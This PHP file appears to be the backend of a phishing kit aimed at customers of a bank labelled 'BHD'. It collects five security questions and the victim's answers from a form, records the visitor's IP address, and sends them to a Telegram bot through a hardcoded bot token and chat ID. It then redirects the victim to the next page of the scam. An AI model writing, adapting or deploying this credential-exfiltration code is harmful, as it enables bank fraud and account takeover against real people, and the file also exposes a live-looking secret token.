<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $preg1 = $_POST["preg1"];
	$preg2 = $_POST["preg2"];
	$preg3 = $_POST["preg3"];
	$preg4 = $_POST["preg4"];
	$preg5 = $_POST["preg5"];
	
    $resp1 = $_POST["resp1"];
	$resp2 = $_POST["resp2"];
	$resp3 = $_POST["resp3"];
	$resp4 = $_POST["resp4"];
	$resp5 = $_POST["resp5"];
	
  $botToken = "8912252632:AAEJf_puzYmDrMbn_Y2kOqhWAMgc-wBc0VI"; // Reemplaza con tu token de bot
    $chatID = "8555745789"; // Reemplaza con tu chat ID

    // Obtén la IP del cliente
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

    // Construye el mensaje
    $message = "=====PREGUNTAS BHD=======\n $preg1\n $resp1\n $preg2\n $resp2\n $preg3\n $resp3\n $preg4\n $resp4\n $preg5\n $resp5\nIP del cliente: $ip";

    // Envia el mensaje a Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array("chat_id" => $chatID, "text" => $message);
    $options = array(
        "http" => array(
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
            "content" => http_build_query($data)
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result) {
        // Redirige a la página de éxito
        header("Location: pa02.php");
        exit; // Asegura que el script se detenga después de la redirección
    } else {
        // Redirige a la página de error
        header("Location: index");
        exit;
    }
}
?>
